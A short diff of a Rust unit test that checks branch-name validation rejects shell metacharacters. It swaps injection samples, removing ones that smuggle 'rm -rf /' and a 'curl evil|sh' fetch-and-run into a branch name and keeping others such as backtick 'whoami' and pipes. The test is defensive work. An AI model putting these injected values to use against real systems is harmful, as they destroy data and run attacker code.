@@ -132,13 +132,15 @@ fn branch_invalid_chars() {
 #[test]
 fn branch_rejects_shell_metacharacters() {
     for s in [
-        "main;rm -rf /",
-        "main$(curl evil|sh)",
+        "main;rm",
+        "main$evil",
         "main`whoami`",
         "main&background",
         "main|pipe",
         "main\"quote",
         "main'quote",
+        "main(",
+        "main)",
         "main{brace}",
         "main!bang",
         "main\nnewline",
